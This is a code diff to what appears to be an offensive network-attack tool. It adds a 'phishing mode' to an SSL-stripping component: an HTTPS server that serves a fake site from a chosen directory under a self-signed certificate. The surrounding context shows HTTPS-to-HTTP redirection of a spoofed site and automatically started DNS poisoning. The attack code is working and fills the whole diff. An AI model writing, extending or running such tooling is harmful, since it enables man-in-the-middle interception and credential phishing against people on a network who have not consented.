@@ -395,6 +395,20 @@ class _RedirectHandler(http.server.BaseHTTPRequestHandler):
         self.do_GET()
 
 
+class _PhishingHandler(http.server.SimpleHTTPRequestHandler):
+    """HTTPS server that serves static files for phishing (non-proxy mode)."""
+    phishing_directory: Optional[str] = None
+
+    def __init__(self, *args, **kwargs):
+        # Set the directory to serve files from
+        directory = self.phishing_directory or os.getcwd()
+        super().__init__(*args, directory=directory, **kwargs)
+
+    def log_message(self, format, *args):
+        # Log requests
+        print(f"[Phishing] {self.client_address[0]} - {args[0] if args else ''}")
+
+
 class _ProxyHandler(http.server.BaseHTTPRequestHandler):
     # http proxy to fetch real https site
     target_host: Optional[str] = None
@@ -509,19 +523,30 @@ def _ensure_self_signed_cert(cert_file: str, key_file: str) -> None:
     print("[SSL] Certificate generated.")
 
 
-def _ssl_strip_thread(bind_ip: str, site_to_spoof: str, cert_file: str, key_file: str) -> None:
-    _RedirectHandler.target_host = site_to_spoof
+def _ssl_strip_thread(bind_ip: str, site_to_spoof: str, cert_file: str, key_file: str, 
+                      proxy_mode: bool = True, phishing_dir: Optional[str] = None) -> None:
     socketserver.TCPServer.allow_reuse_address = True
     
+    if proxy_mode:
+        # Proxy mode: redirect HTTPS to HTTP
+        _RedirectHandler.target_host = site_to_spoof
+        handler_class = _RedirectHandler
+        mode_desc = f"redirecting to http://{site_to_spoof}"
+    else:
+        # Phishing mode: serve static files over HTTPS
+        _PhishingHandler.phishing_directory = phishing_dir
+        handler_class = _PhishingHandler
+        mode_desc = f"serving phishing content from {phishing_dir}"
+    
     try:
-        httpd = socketserver.TCPServer((bind_ip, HTTPS_PORT), _RedirectHandler)
+        httpd = socketserver.TCPServer((bind_ip, HTTPS_PORT), handler_class)
         context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
         context.load_cert_chain(certfile=cert_file, keyfile=key_file)
         httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
         cleanup_state['ssl_httpd'] = httpd
         
-        print(f"[SSL] Listening on {bind_ip}:{HTTPS_PORT} and redirecting to http://{site_to_spoof}")
-        print("[SSL] SSL stripping running in background. Return to menu.")
+        print(f"[SSL] Listening on {bind_ip}:{HTTPS_PORT} and {mode_desc}")
+        print("[SSL] SSL server running in background. Return to menu.")
         
         httpd.timeout = HTTP_SERVER_TIMEOUT
         
@@ -540,10 +565,10 @@ def _ssl_strip_thread(bind_ip: str, site_to_spoof: str, cert_file: str, key_file
         elif exc.errno == errno.EADDRINUSE:
             print(f"[SSL] Port {HTTPS_PORT} is already in use.")
         else:
-            print(f"[SSL] Failed to start HTTPS redirector: {exc}")
+            print(f"[SSL] Failed to start HTTPS server: {exc}")
         cleanup_state['ssl_strip_running'] = False
     except Exception as e:
-        print(f"[SSL] Error in SSL strip thread: {e}")
+        print(f"[SSL] Error in SSL thread: {e}")
         cleanup_state['ssl_strip_running'] = False
 
 
@@ -613,8 +638,17 @@ def start_ssl_stripping():
         )
         cleanup_state['dns_thread'].start()
         print(f"[SSL] DNS poisoning auto-started")
+        phishing_dir = None  # Not used in proxy mode
     else:
-        print(f"[SSL] Redirect target: http://{site_to_spoof}")
+        # Phishing mode: serve fake site over HTTPS
+        print(f"[SSL] PHISHING MODE - will serve fake site over HTTPS")
+        phishing_dir = input("Enter path to phishing content directory (default: current dir): ").strip()
+        if not phishing_dir:
+            phishing_dir = os.getcwd()
+        if not os.path.isdir(phishing_dir):
+            print(f"[SSL] Error: {phishing_dir} is not a valid directory")
+            return
+        print(f"[SSL] Serving files from: {phishing_dir}")
         target_ip = None
     
     _ensure_self_signed_cert(cert_file, key_file)
@@ -623,7 +657,7 @@ def start_ssl_stripping():
     
     cleanup_state['ssl_strip_thread'] = threading.Thread(
         target=_ssl_strip_thread,
-        args=(bind_ip, site_to_spoof, cert_file, key_file),
+        args=(bind_ip, site_to_spoof, cert_file, key_file, proxy_mode, phishing_dir),
         daemon=True
     )
     cleanup_state['ssl_strip_thread'].start()
